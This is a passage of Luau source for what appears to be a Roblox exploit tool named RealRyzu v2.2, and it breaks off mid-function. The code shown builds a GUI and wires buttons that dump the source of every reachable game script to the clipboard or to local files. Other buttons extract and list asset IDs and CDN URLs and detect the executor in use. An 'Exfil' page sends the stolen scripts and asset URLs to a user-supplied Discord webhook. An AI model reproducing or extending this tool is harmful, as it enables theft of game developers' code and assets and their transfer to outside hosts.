ManifestBtn.BorderSizePixel = 0
ManifestBtn.Parent = DumpPage

local DumpAllBtn = Instance.new("TextButton")
DumpAllBtn.Size = UDim2.new(1, 0, 0, 28)
DumpAllBtn.Position = UDim2.new(0, 0, 0, 138)
DumpAllBtn.BackgroundColor3 = Color3.fromRGB(0, 155, 235)
DumpAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
DumpAllBtn.Font = Enum.Font.Code
DumpAllBtn.TextSize = 11
DumpAllBtn.Text = "🔴 DUMP EVERYTHING (SCRIPTS + ASSETS + STRUCTURE)"
DumpAllBtn.BorderSizePixel = 0
DumpAllBtn.Parent = DumpPage

-- ═══════════════════════════════════════════════════════════════════════
-- ASSETS PAGE
-- ═══════════════════════════════════════════════════════════════════════
local AssetsPage = CreatePage("Assets")

local AssetFilterText = Instance.new("TextLabel")
AssetFilterText.Size = UDim2.new(1, 0, 0, 14)
AssetFilterText.Position = UDim2.new(0, 0, 0, 4)
AssetFilterText.BackgroundTransparency = 1
AssetFilterText.TextColor3 = Color3.fromRGB(165, 210, 230)
AssetFilterText.Font = Enum.Font.Code
AssetFilterText.TextSize = 10
AssetFilterText.Text = "Asset Types to Extract:"
AssetFilterText.TextXAlignment = Enum.TextXAlignment.Left
AssetFilterText.Parent = AssetsPage

local assetCfgs = {
    {lbl="MESHES", key="meshes", clr=Color3.fromRGB(0,150,215)},
    {lbl="SOUNDS", key="sounds", clr=Color3.fromRGB(0,190,110)},
    {lbl="DECALS", key="decals", clr=Color3.fromRGB(190,150,0)},
    {lbl="IMAGES", key="images", clr=Color3.fromRGB(215,90,170)},
    {lbl="ANIMS", key="animations", clr=Color3.fromRGB(150,110,215)},
    {lbl="VIDEOS", key="videos", clr=Color3.fromRGB(215,70,70)},
}
local assetToggles = {}
for _, ac in ipairs(assetCfgs) do assetToggles[ac.key] = true end

for i, ac in ipairs(assetCfgs) do
    local col = (i-1) % 3
    local row = math.floor((i-1)/3)
    local tgl = Instance.new("TextButton")
    tgl.Size = UDim2.new(0, 105, 0, 22)
    tgl.Position = UDim2.new(0, col*113, 0, 20+row*26)
    tgl.BackgroundColor3 = ac.clr
    tgl.TextColor3 = Color3.fromRGB(255,255,255)
    tgl.Font = Enum.Font.Code
    tgl.TextSize = 9
    tgl.Text = "✓ " .. ac.lbl
    tgl.BorderSizePixel = 0
    tgl.Parent = AssetsPage
    
    local on = true
    tgl.MouseButton1Click:Connect(function()
        on = not on; assetToggles[ac.key] = on
        if on then tgl.BackgroundColor3 = ac.clr; tgl.Text = "✓ " .. ac.lbl
        else tgl.BackgroundColor3 = Color3.fromRGB(36,36,48); tgl.Text = "✗ " .. ac.lbl end
    end)
end

local AssetCount = Instance.new("TextLabel")
AssetCount.Size = UDim2.new(1, 0, 0, 14)
AssetCount.Position = UDim2.new(0, 0, 0, 78)
AssetCount.BackgroundTransparency = 1
AssetCount.TextColor3 = Color3.fromRGB(125,215,145)
AssetCount.Font = Enum.Font.Code
AssetCount.TextSize = 10
AssetCount.Text = "Assets: 0"
AssetCount.TextXAlignment = Enum.TextXAlignment.Left
AssetCount.Parent = AssetsPage

local RipBtn = Instance.new("TextButton")
RipBtn.Size = UDim2.new(1, 0, 0, 28)
RipBtn.Position = UDim2.new(0, 0, 0, 98)
RipBtn.BackgroundColor3 = Color3.fromRGB(0,140,100)
RipBtn.TextColor3 = Color3.fromRGB(255,255,255)
RipBtn.Font = Enum.Font.Code
RipBtn.TextSize = 11
RipBtn.Text = "🎨 EXTRACT ALL ASSETS + SAVE LOCALLY"
RipBtn.BorderSizePixel = 0
RipBtn.Parent = AssetsPage

local URLBtn = Instance.new("TextButton")
URLBtn.Size = UDim2.new(1, 0, 0, 26)
URLBtn.Position = UDim2.new(0, 0, 0, 132)
URLBtn.BackgroundColor3 = Color3.fromRGB(0,80,58)
URLBtn.TextColor3 = Color3.fromRGB(190,240,210)
URLBtn.Font = Enum.Font.Code
URLBtn.TextSize = 10
URLBtn.Text = "🔗 EXPORT CDN URL LIST"
URLBtn.BorderSizePixel = 0
URLBtn.Parent = AssetsPage

-- ═══════════════════════════════════════════════════════════════════════
-- EXECUTOR PAGE
-- ═══════════════════════════════════════════════════════════════════════
local ExecPage = CreatePage("Executor")

local ExecInfo = Instance.new("Frame")
ExecInfo.Size = UDim2.new(1, 0, 0, 60)
ExecInfo.Position = UDim2.new(0, 0, 0, 4)
ExecInfo.BackgroundColor3 = Color3.fromRGB(8, 8, 16)
ExecInfo.BorderSizePixel = 0
ExecInfo.Parent = ExecPage

local ExecNameLabel = Instance.new("TextLabel")
ExecNameLabel.Size = UDim2.new(1, -12, 0, 16)
ExecNameLabel.Position = UDim2.new(0, 6, 0, 6)
ExecNameLabel.BackgroundTransparency = 1
ExecNameLabel.TextColor3 = Color3.fromRGB(0,210,250)
ExecNameLabel.Font = Enum.Font.Code
ExecNameLabel.TextSize = 12
ExecNameLabel.TextXAlignment = Enum.TextXAlignment.Left
ExecNameLabel.Text = "Detected: Scanning..."
ExecNameLabel.Parent = ExecInfo

local ExecConfLabel = Instance.new("TextLabel")
ExecConfLabel.Size = UDim2.new(1, -12, 0, 14)
ExecConfLabel.Position = UDim2.new(0, 6, 0, 24)
ExecConfLabel.BackgroundTransparency = 1
ExecConfLabel.TextColor3 = Color3.fromRGB(150,170,190)
ExecConfLabel.Font = Enum.Font.Code
ExecConfLabel.TextSize = 9
ExecConfLabel.TextXAlignment = Enum.TextXAlignment.Left
ExecConfLabel.Text = "Confidence: N/A"
ExecConfLabel.Parent = ExecInfo

local ExecFuncsLabel = Instance.new("TextLabel")
ExecFuncsLabel.Size = UDim2.new(1, -12, 0, 14)
ExecFuncsLabel.Position = UDim2.new(0, 6, 0, 40)
ExecFuncsLabel.BackgroundTransparency = 1
ExecFuncsLabel.TextColor3 = Color3.fromRGB(130,150,170)
ExecFuncsLabel.Font = Enum.Font.Code
ExecFuncsLabel.TextSize = 9
ExecFuncsLabel.TextXAlignment = Enum.TextXAlignment.Left
ExecFuncsLabel.Text = "Functions: 0 available"
ExecFuncsLabel.Parent = ExecInfo

local ExecScanBtn = Instance.new("TextButton")
ExecScanBtn.Size = UDim2.new(1, 0, 0, 26)
ExecScanBtn.Position = UDim2.new(0, 0, 0, 70)
ExecScanBtn.BackgroundColor3 = Color3.fromRGB(85, 25, 150)
ExecScanBtn.TextColor3 = Color3.fromRGB(255,255,255)
ExecScanBtn.Font = Enum.Font.Code
ExecScanBtn.TextSize = 10
ExecScanBtn.Text = "🔍 FULL ENVIRONMENT SCAN"
ExecScanBtn.BorderSizePixel = 0
ExecScanBtn.Parent = ExecPage

local ExecSaveBtn = Instance.new("TextButton")
ExecSaveBtn.Size = UDim2.new(1, 0, 0, 26)
ExecSaveBtn.Position = UDim2.new(0, 0, 0, 102)
ExecSaveBtn.BackgroundColor3 = Color3.fromRGB(55, 18, 100)
ExecSaveBtn.TextColor3 = Color3.fromRGB(210,210,250)
ExecSaveBtn.Font = Enum.Font.Code
ExecSaveBtn.TextSize = 10
ExecSaveBtn.Text = "💾 SAVE REPORT"
ExecSaveBtn.BorderSizePixel = 0
ExecSaveBtn.Parent = ExecPage

local ExecCopyBtn = Instance.new("TextButton")
ExecCopyBtn.Size = UDim2.new(1, 0, 0, 26)
ExecCopyBtn.Position = UDim2.new(0, 0, 0, 134)
ExecCopyBtn.BackgroundColor3 = Color3.fromRGB(35, 12, 70)
ExecCopyBtn.TextColor3 = Color3.fromRGB(190,190,230)
ExecCopyBtn.Font = Enum.Font.Code
ExecCopyBtn.TextSize = 10
ExecCopyBtn.Text = "📋 COPY REPORT"
ExecCopyBtn.BorderSizePixel = 0
ExecCopyBtn.Parent = ExecPage

-- ═══════════════════════════════════════════════════════════════════════
-- EXFIL PAGE
-- ═══════════════════════════════════════════════════════════════════════
local ExfilPage = CreatePage("Exfil")

local ExfilLabel = Instance.new("TextLabel")
ExfilLabel.Size = UDim2.new(1, 0, 0, 14)
ExfilLabel.Position = UDim2.new(0, 0, 0, 4)
ExfilLabel.BackgroundTransparency = 1
ExfilLabel.TextColor3 = Color3.fromRGB(255,190,50)
ExfilLabel.Font = Enum.Font.Code
ExfilLabel.TextSize = 10
ExfilLabel.Text = "Discord Webhook Exfiltration"
ExfilLabel.TextXAlignment = Enum.TextXAlignment.Left
ExfilLabel.Parent = ExfilPage

local WebhookBox = Instance.new("TextBox")
WebhookBox.Size = UDim2.new(1, 0, 0, 28)
WebhookBox.Position = UDim2.new(0, 0, 0, 20)
WebhookBox.BackgroundColor3 = Color3.fromRGB(14, 14, 28)
WebhookBox.TextColor3 = Color3.fromRGB(200, 200, 230)
WebhookBox.Font = Enum.Font.Code
WebhookBox.TextSize = 9
WebhookBox.PlaceholderText = "Discord webhook URL..."
WebhookBox.PlaceholderColor3 = Color3.fromRGB(80, 80, 105)
WebhookBox.Text = ""
WebhookBox.BorderSizePixel = 0
WebhookBox.Parent = ExfilPage

local SetHookBtn = Instance.new("TextButton")
SetHookBtn.Size = UDim2.new(0, 180, 0, 24)
SetHookBtn.Position = UDim2.new(0, 0, 0, 54)
SetHookBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 85)
SetHookBtn.TextColor3 = Color3.fromRGB(220, 220, 250)
SetHookBtn.Font = Enum.Font.Code
SetHookBtn.TextSize = 10
SetHookBtn.Text = "🔗 SET WEBHOOK"
SetHookBtn.BorderSizePixel = 0
SetHookBtn.Parent = ExfilPage

local TestHookBtn = Instance.new("TextButton")
TestHookBtn.Size = UDim2.new(0, 180, 0, 24)
TestHookBtn.Position = UDim2.new(0, 188, 0, 54)
TestHookBtn.BackgroundColor3 = Color3.fromRGB(40, 65, 40)
TestHookBtn.TextColor3 = Color3.fromRGB(190, 230, 190)
TestHookBtn.Font = Enum.Font.Code
TestHookBtn.TextSize = 10
TestHookBtn.Text = "📤 TEST"
TestHookBtn.BorderSizePixel = 0
TestHookBtn.Parent = ExfilPage

local ExfilAllBtn = Instance.new("TextButton")
ExfilAllBtn.Size = UDim2.new(1, 0, 0, 28)
ExfilAllBtn.Position = UDim2.new(0, 0, 0, 84)
ExfilAllBtn.BackgroundColor3 = Color3.fromRGB(190, 110, 25)
ExfilAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExfilAllBtn.Font = Enum.Font.Code
ExfilAllBtn.TextSize = 11
ExfilAllBtn.Text = "📤 EXFILTRATE ALL SCRIPTS"
ExfilAllBtn.BorderSizePixel = 0
ExfilAllBtn.Parent = ExfilPage

local ExfilAssetsBtn = Instance.new("TextButton")
ExfilAssetsBtn.Size = UDim2.new(1, 0, 0, 26)
ExfilAssetsBtn.Position = UDim2.new(0, 0, 0, 118)
ExfilAssetsBtn.BackgroundColor3 = Color3.fromRGB(150, 80, 18)
ExfilAssetsBtn.TextColor3 = Color3.fromRGB(250, 230, 200)
ExfilAssetsBtn.Font = Enum.Font.Code
ExfilAssetsBtn.TextSize = 10
ExfilAssetsBtn.Text = "📤 EXFILTRATE ASSET URLS"
ExfilAssetsBtn.BorderSizePixel = 0
ExfilAssetsBtn.Parent = ExfilPage

local ExfilStats = Instance.new("TextLabel")
ExfilStats.Size = UDim2.new(1, 0, 0, 14)
ExfilStats.Position = UDim2.new(0, 0, 0, 150)
ExfilStats.BackgroundTransparency = 1
ExfilStats.TextColor3 = Color3.fromRGB(110, 195, 110)
ExfilStats.Font = Enum.Font.Code
ExfilStats.TextSize = 9
ExfilStats.Text = "Chunks: 0 | Data: 0 KB"
ExfilStats.TextXAlignment = Enum.TextXAlignment.Left
ExfilStats.Parent = ExfilPage

-- ═══════════════════════════════════════════════════════════════════════
-- SETTINGS PAGE
-- ═══════════════════════════════════════════════════════════════════════
local SettingsPage = CreatePage("Settings")

local WMToggle = Instance.new("TextButton")
WMToggle.Size = UDim2.new(1, 0, 0, 26)
WMToggle.Position = UDim2.new(0, 0, 0, 4)
WMToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
WMToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
WMToggle.Font = Enum.Font.Code
WMToggle.TextSize = 10
WMToggle.Text = "✓ WATERMARK: ENABLED"
WMToggle.BorderSizePixel = 0
WMToggle.Parent = SettingsPage

local wmOn = true
WMToggle.MouseButton1Click:Connect(function()
    wmOn = not wmOn
    if wmOn then
        WMToggle.BackgroundColor3 = Color3.fromRGB(0, 130, 70)
        WMToggle.Text = "✓ WATERMARK: ENABLED"
    else
        WMToggle.BackgroundColor3 = Color3.fromRGB(62, 22, 22)
        WMToggle.Text = "✗ WATERMARK: DISABLED"
    end
end)

local ExportAllBtn = Instance.new("TextButton")
ExportAllBtn.Size = UDim2.new(1, 0, 0, 32)
ExportAllBtn.Position = UDim2.new(0, 0, 0, 36)
ExportAllBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 235)
ExportAllBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExportAllBtn.Font = Enum.Font.Code
ExportAllBtn.TextSize = 12
ExportAllBtn.Text = "💾 EXPORT MANIFEST + ALL DATA"
ExportAllBtn.BorderSizePixel = 0
ExportAllBtn.Parent = SettingsPage

local ClearBtn = Instance.new("TextButton")
ClearBtn.Size = UDim2.new(1, 0, 0, 26)
ClearBtn.Position = UDim2.new(0, 0, 0, 74)
ClearBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
ClearBtn.TextColor3 = Color3.fromRGB(255, 155, 155)
ClearBtn.Font = Enum.Font.Code
ClearBtn.TextSize = 10
ClearBtn.Text = "🗑 CLEAR LOCAL CACHE"
ClearBtn.BorderSizePixel = 0
ClearBtn.Parent = SettingsPage

local AboutText = Instance.new("TextLabel")
AboutText.Size = UDim2.new(1, 0, 0, 80)
AboutText.Position = UDim2.new(0, 0, 0, 106)
AboutText.BackgroundTransparency = 1
AboutText.TextColor3 = Color3.fromRGB(105, 105, 140)
AboutText.Font = Enum.Font.Code
AboutText.TextSize = 9
AboutText.Text = "RealRyzu v2.2\nLIVE GAME REBUILDER\nClones directly into REAL services\nGame runs when you hit play\nScripts execute, GUIs appear\nAll files watermarked\ndiscord.gg/realryzu"
AboutText.TextXAlignment = Enum.TextXAlignment.Center
AboutText.Parent = SettingsPage

-- ═══════════════════════════════════════════════════════════════════════
-- LOG AREA
-- ═══════════════════════════════════════════════════════════════════════
local LogFrame = Instance.new("Frame")
LogFrame.Size = UDim2.new(1, -16, 0, 112)
LogFrame.Position = UDim2.new(0, 8, 0, 323)
LogFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
LogFrame.BorderSizePixel = 0
LogFrame.Parent = MainFrame

local LogScroll = Instance.new("ScrollingFrame")
LogScroll.Size = UDim2.new(1, -6, 1, -6)
LogScroll.Position = UDim2.new(0, 3, 0, 3)
LogScroll.BackgroundTransparency = 1
LogScroll.BorderSizePixel = 0
LogScroll.ScrollBarThickness = 3
LogScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 160, 230)
LogScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
LogScroll.Parent = LogFrame

local LogContent = Instance.new("TextLabel")
LogContent.Size = UDim2.new(1, -4, 0, 14)
LogContent.Position = UDim2.new(0, 2, 0, 0)
LogContent.BackgroundTransparency = 1
LogContent.TextColor3 = Color3.fromRGB(145, 250, 160)
LogContent.Font = Enum.Font.Code
LogContent.TextSize = 9
LogContent.TextXAlignment = Enum.TextXAlignment.Left
LogContent.TextYAlignment = Enum.TextYAlignment.Top
LogContent.TextWrapped = true
LogContent.Text = ""
LogContent.Parent = LogScroll

-- Bottom bar
local BottomBar = Instance.new("Frame")
BottomBar.Size = UDim2.new(1, 0, 0, 24)
BottomBar.Position = UDim2.new(0, 0, 1, -24)
BottomBar.BackgroundColor3 = Color3.fromRGB(7, 7, 15)
BottomBar.BorderSizePixel = 0
BottomBar.Parent = MainFrame

local RuntimeLabel = Instance.new("TextLabel")
RuntimeLabel.Size = UDim2.new(0, 320, 1, 0)
RuntimeLabel.Position = UDim2.new(0, 8, 0, 0)
RuntimeLabel.BackgroundTransparency = 1
RuntimeLabel.TextColor3 = Color3.fromRGB(110, 215, 110)
RuntimeLabel.Font = Enum.Font.Code
RuntimeLabel.TextSize = 9
RuntimeLabel.Text = "Runtime: 0s | Files: 0 | Size: 0 KB"
RuntimeLabel.TextXAlignment = Enum.TextXAlignment.Left
RuntimeLabel.Parent = BottomBar

local ModeLabel = Instance.new("TextLabel")
ModeLabel.Size = UDim2.new(0, 280, 1, 0)
ModeLabel.Position = UDim2.new(1, -288, 0, 0)
ModeLabel.BackgroundTransparency = 1
ModeLabel.TextColor3 = Color3.fromRGB(110, 190, 230)
ModeLabel.Font = Enum.Font.Code
ModeLabel.TextSize = 9
ModeLabel.Text = "Mode: Idle | Output: LIVE SERVICES"
ModeLabel.TextXAlignment = Enum.TextXAlignment.Right
ModeLabel.Parent = BottomBar

-- ═══════════════════════════════════════════════════════════════════════
-- LOGGING
-- ═══════════════════════════════════════════════════════════════════════
local logBuf = {}
local function Log(msg, color)
    color = color or Color3.fromRGB(145, 250, 160)
    local entry = "[" .. os.date("%H:%M:%S") .. "] " .. msg
    table.insert(logBuf, {text=entry, col=color})
    if #logBuf > 80 then table.remove(logBuf, 1) end
    local lines = {}
    local s = math.max(1, #logBuf - 28)
    for i = s, #logBuf do table.insert(lines, logBuf[i].text) end
    LogContent.Text = table.concat(lines, "\n")
    LogContent.Size = UDim2.new(1, -4, 0, math.max(LogContent.TextBounds.Y, 14))
    LogScroll.CanvasSize = UDim2.new(0, 0, 0, LogContent.TextBounds.Y + 6)
    task.wait()
    LogScroll.CanvasPosition = Vector2.new(0, LogScroll.CanvasSize.Y.Offset)
end

-- ═══════════════════════════════════════════════════════════════════════
-- UI UPDATE
-- ═══════════════════════════════════════════════════════════════════════
local function UpdateRebuildUI(pct)
    pct = math.min(pct or 0, 100)
    BigPercent.Text = string.format("%.1f%%", pct)
    ProgFill.Size = UDim2.new(pct/100, 0, 1, 0)
    
    local r = 0; local g = 250-(70*pct/100); local b = 180-(140*pct/100)
    BigPercent.TextColor3 = Color3.fromRGB(r/255, math.max(g,0)/255, math.max(b,0)/255)
    
    local elapsed = GameRebuilder.Stats.StartTime > 0 and (tick()-GameRebuilder.Stats.StartTime) or 0
    local eta = "--:--"
    if GameRebuilder.Stats.ClonedObjects > 0 and GameRebuilder.Stats.TotalObjects > 0 then
        local rate = GameRebuilder.Stats.ClonedObjects / math.max(elapsed, 0.01)
        local rem = GameRebuilder.Stats.TotalObjects - GameRebuilder.Stats.ClonedObjects
        if rate > 0 then
            local sec = rem/rate
            eta = string.format("%d:%02d", math.floor(sec/60), math.floor(sec%60))
        end
    end
    
    StatsRow.Text = string.format("Objects: %d/%d | Scripts tagged: %d | Failed: %d | ETA: %s",
        GameRebuilder.Stats.ClonedObjects, GameRebuilder.Stats.TotalObjects,
        GameRebuilder.Stats.TaggedScripts, GameRebuilder.Stats.FailedClones, eta)
    
    FSStats.Text = string.format("💾 Local Files: %d | Size: %.1f KB",
        VirtualFS.TotalFiles, VirtualFS.TotalBytes/1024)
    
    CurrentObjText.Text = GameRebuilder.Stats.CurrentItem or "..."
    
    RuntimeLabel.Text = string.format("Runtime: %.1fs | Files: %d | Size: %.1f KB",
        elapsed, VirtualFS.TotalFiles, VirtualFS.TotalBytes/1024)
    
    ModeLabel.Text = GameRebuilder.IsRunning and "Mode: REBUILDING" or "Mode: Idle"
end

-- ═══════════════════════════════════════════════════════════════════════
-- MAIN EXECUTION
-- ═══════════════════════════════════════════════════════════════════════
local function RunRebuild(quick, dumpOnly)
    if GameRebuilder.IsRunning then
        Log("Already running!", Color3.fromRGB(255, 200, 55))
        return
    end
    
    GameRebuilder.IsRunning = true
    GameRebuilder.CancelRequested = false
    GameRebuilder.IsPaused = false
    
    Log(string.rep("═", 55), Color3.fromRGB(0, 200, 255))
    Log("  REALRYZU v2.2 — LIVE GAME REBUILDER", Color3.fromRGB(0, 240, 255))
    Log("  Mode: " .. (dumpOnly and "DUMP ONLY" or (quick and "QUICK" or "FULL REBUILD")), Color3.fromRGB(170, 220, 240))
    Log("  Output: REAL SERVICES (game will run)", Color3.fromRGB(110, 230, 110))
    Log("  Local backup: Enabled", Color3.fromRGB(110, 230, 110))
    Log(string.rep("═", 55), Color3.fromRGB(0, 200, 255))
    
    StatusText.Text = "STATUS: Counting objects..."
    StatusText.TextColor3 = Color3.fromRGB(225, 210, 55)
    
    RebuildFullBtn.Text = "🔄 REBUILDING..."
    RebuildFullBtn.BackgroundColor3 = Color3.fromRGB(0, 80, 140)
    
    -- Mark services as in-progress
    for name, lbl in pairs(serviceStatusLabels) do
        lbl.Text = "◉ " .. name:sub(1, 12)
        lbl.TextColor3 = Color3.fromRGB(225, 210, 55)
    end
    
    local result = GameRebuilder:ExecuteFullRebuild(
        quick, dumpOnly,
        function(pct)
            UpdateRebuildUI(pct)
        end
    )
    
    local elapsed = tick() - GameRebuilder.Stats.StartTime
    
    -- Mark services as done
    for name, lbl in pairs(serviceStatusLabels) do
        lbl.Text = "✓ " .. name:sub(1, 12)
        lbl.TextColor3 = Color3.fromRGB(110, 230, 110)
    end
    
    if GameRebuilder.CancelRequested then
        StatusText.Text = "STATUS: Cancelled"
        StatusText.TextColor3 = Color3.fromRGB(255, 110, 110)
        Log("REBUILD CANCELLED", Color3.fromRGB(255, 160, 160))
    else
        StatusText.Text = "STATUS: Complete ✓ — Game ready to play!"
        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
        
        Log(string.rep("═", 55), Color3.fromRGB(0, 205, 255))
        Log("  REBUILD COMPLETE — GAME CAN NOW BE PLAYED", Color3.fromRGB(0, 255, 150))
        Log("  Objects: " .. (result.ClonedObjects or 0), Color3.fromRGB(150, 255, 150))
        Log("  Scripts tagged: " .. (result.TaggedScripts or 0), Color3.fromRGB(150, 255, 150))
        Log("  Files saved: " .. (result.TotalFiles or 0), Color3.fromRGB(150, 255, 150))
        Log("  Size: " .. string.format("%.2f MB", (result.TotalBytes or 0)/1048576), Color3.fromRGB(150, 255, 150))
        Log("  Time: " .. string.format("%.1fs", elapsed), Color3.fromRGB(190, 220, 240))
        Log("  Services injected: ServerScriptService, ReplicatedStorage,", Color3.fromRGB(200, 200, 110))
        Log("    StarterGui, StarterPack, StarterPlayer, Workspace, etc.", Color3.fromRGB(200, 200, 110))
        Log("  Manifest copied to clipboard", Color3.fromRGB(200, 200, 110))
        Log(string.rep("═", 55), Color3.fromRGB(0, 205, 255))
        
        UpdateRebuildUI(100)
    end
    
    GameRebuilder.IsRunning = false
    RebuildFullBtn.Text = "🔴 REBUILD GAME"
    RebuildFullBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 240)
end

-- ═══════════════════════════════════════════════════════════════════════
-- BUTTON WIRING
-- ═══════════════════════════════════════════════════════════════════════
RebuildFullBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunRebuild(false, false) end)
end)
RebuildQuickBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunRebuild(true, false) end)
end)
DumpOnlyButton.MouseButton1Click:Connect(function()
    task.spawn(function() RunRebuild(false, true) end)
end)

PauseButton.MouseButton1Click:Connect(function()
    if not GameRebuilder.IsRunning then return end
    GameRebuilder.IsPaused = not GameRebuilder.IsPaused
    if GameRebuilder.IsPaused then
        PauseButton.Text = "▶ RESUME"
        PauseButton.TextColor3 = Color3.fromRGB(150, 255, 150)
        StatusText.Text = "STATUS: Paused"
        StatusText.TextColor3 = Color3.fromRGB(225, 210, 55)
    else
        PauseButton.Text = "⏸ PAUSE"
        PauseButton.TextColor3 = Color3.fromRGB(225, 210, 55)
        StatusText.Text = "STATUS: Rebuilding..."
        StatusText.TextColor3 = Color3.fromRGB(0, 225, 160)
    end
end)

CancelButton.MouseButton1Click:Connect(function()
    if not GameRebuilder.IsRunning then ScreenGui:Destroy(); return end
    GameRebuilder.CancelRequested = true
    Log("Cancelling...", Color3.fromRGB(255, 110, 110))
end)

DumpClipBtn.MouseButton1Click:Connect(function()
    local src = ""; local cnt = 0
    for _, t in ipairs(CLONE_TARGETS) do
        for _, obj in ipairs(t.Source:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local s = ""; pcall(function() s=obj.Source end)
                if s~="" then src=src..RYZU_WATERMARK.."\n\n-- "..obj:GetFullName().."\n\n"..s.."\n\n"; cnt=cnt+1 end
            end
        end
    end
    pcall(function() setclipboard(src) end)
    DumpCount.Text = "Scripts: " .. cnt
    Log("Dumped "..cnt.." scripts to clipboard!", Color3.fromRGB(150,255,150))
end)

DumpSaveBtn.MouseButton1Click:Connect(function()
    VirtualFS.Root={}; VirtualFS.TotalFiles=0; VirtualFS.TotalBytes=0; VirtualFS.FileList={}
    local cnt = 0
    for _, t in ipairs(CLONE_TARGETS) do
        for _, obj in ipairs(t.Source:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local s=""; pcall(function() s=obj.Source end)
                if s~="" then
                    local safe=obj:GetFullName():gsub("[^%w%./_%-]","_")
                    VirtualFS:WriteFile("RealRyzu_Game/Scripts/"+safe+".lua", RYZU_WATERMARK.."\n"..s)
                    cnt=cnt+1
                end
            end
        end
    end
    local m=VirtualFS:GetManifest(); pcall(function() setclipboard(m) end)
    DumpCount.Text = "Saved: "..cnt
    Log("Saved "..cnt.." scripts locally!", Color3.fromRGB(150,255,150))
end)

DumpAllBtn.MouseButton1Click:Connect(function()
    task.spawn(function() RunRebuild(false, true) end)
end)

RipBtn.MouseButton1Click:Connect(function()
    local cnt=0
    for _, t in ipairs(CLONE_TARGETS) do
        for _, obj in ipairs(t.Source:GetDescendants()) do
            local done=false
            if obj:IsA("MeshPart") and assetToggles["meshes"] then
                VirtualFS:WriteFile("RealRyzu_Assets/Meshes/"..obj:GetFullName():gsub("[^%w%./_%-]","_")..".json",
                    WATERMARK_SHORT.."\n"..HttpService:JSONEncode({MeshId=tostring(obj.MeshId),TextureID=tostring(obj.TextureID)}))
                done=true
            elseif obj:IsA("Sound") and assetToggles["sounds"] then
                VirtualFS:WriteFile("RealRyzu_Assets/Sounds/"..obj:GetFullName():gsub("[^%w%./_%-]","_")..".json",
                    WATERMARK_SHORT.."\n"..HttpService:JSONEncode({SoundId=tostring(obj.SoundId)}))
                done=true
            elseif obj:IsA("Decal") and assetToggles["decals"] then
                VirtualFS:WriteFile("RealRyzu_Assets/Decals/"..obj:GetFullName():gsub("[^%w%./_%-]","_")..".json",
                    WATERMARK_SHORT.."\n"..HttpService:JSONEncode({Texture=tostring(obj.Texture)}))
                done=true
            elseif (obj:IsA("ImageLabel") or obj:IsA("ImageButton")) and assetToggles["images"] then
                VirtualFS:WriteFile("RealRyzu_Assets/Images/"..obj:GetFullName():gsub("[^%w%./_%-]","_")..".json",
                    WATERMARK_SHORT.."\n"..HttpService:JSONEncode({Image=tostring(obj.Image)}))
                done=true
            elseif obj:IsA("Animation") and assetToggles["animations"] then
                VirtualFS:WriteFile("RealRyzu_Assets/Animations/"..obj:GetFullName():gsub("[^%w%./_%-]","_")..".json",
                    WATERMARK_SHORT.."\n"..HttpService:JSONEncode({AnimationId=tostring(obj.AnimationId)}))
                done=true
            elseif obj:IsA("VideoFrame") and assetToggles["videos"] then
                VirtualFS:WriteFile("RealRyzu_Assets/Videos/"..obj:GetFullName():gsub("[^%w%./_%-]","_")..".json",
                    WATERMARK_SHORT.."\n"..HttpService:JSONEncode({Video=tostring(obj.Video)}))
                done=true
            end
            if done then cnt=cnt+1 end
        end
    end
    AssetCount.Text = "Assets: "..cnt
    Log("Extracted "..cnt.." assets!", Color3.fromRGB(150,255,150))
end)

URLBtn.MouseButton1Click:Connect(function()
    local urls={}
    for _, t in ipairs(CLONE_TARGETS) do
        for _, obj in ipairs(t.Source:GetDescendants()) do
            local id=nil
            pcall(function() id=obj.MeshId or obj.SoundId or obj.Texture or obj.Image or obj.AnimationId or obj.Video end)
            if id and tostring(id):match("rbxassetid://(%d+)") then
                table.insert(urls, "https://assetdelivery.roblox.com/v1/asset?id="..tostring(id):match("rbxassetid://(%d+)"))
            end
        end
    end
    local out=RYZU_WATERMARK.."\n\n-- RealRyzu CDN URLs\n-- Total: "..#urls.."\n\n"..table.concat(urls,"\n")
    pcall(function() setclipboard(out) end)
    Log("CDN URLs ("..#urls..") copied!", Color3.fromRGB(150,255,150))
end)

ExecScanBtn.MouseButton1Click:Connect(function()
    local name, score = ExecutorDetector:Detect()
    ExecNameLabel.Text = "Detected: " .. name
    ExecConfLabel.Text = "Confidence: " .. string.format("%.1f", score)
    Log("Executor scan: " .. name, Color3.fromRGB(150,210,255))
end)

ExecSaveBtn.MouseButton1Click:Connect(function()
    local name, score = ExecutorDetector:Detect()
    VirtualFS:WriteFile("RealRyzu_Executor/report.lua", RYZU_WATERMARK.."\n\nExecutor: "..name.."\nScore: "..score)
    Log("Report saved!", Color3.fromRGB(150,255,150))
end)

ExecCopyBtn.MouseButton1Click:Connect(function()
    local name, score = ExecutorDetector:Detect()
    pcall(function() setclipboard(RYZU_WATERMARK.."\n\nExecutor: "..name.."\nScore: "..score) end)
    Log("Copied!", Color3.fromRGB(150,255,150))
end)

SetHookBtn.MouseButton1Click:Connect(function()
    if DiscordExfil:SetWebhook(WebhookBox.Text) then
        Log("Webhook set!", Color3.fromRGB(150,255,150))
    else
        Log("Invalid URL", Color3.fromRGB(255,110,110))
    end
end)

TestHookBtn.MouseButton1Click:Connect(function()
    local ok, msg = DiscordExfil:Send("RealRyzu v2.2 connection test", "test.txt")
    if ok then Log("Test sent!", Color3.fromRGB(150,255,150))
    else Log("Failed: "..msg, Color3.fromRGB(255,110,110)) end
end)

ExfilAllBtn.MouseButton1Click:Connect(function()
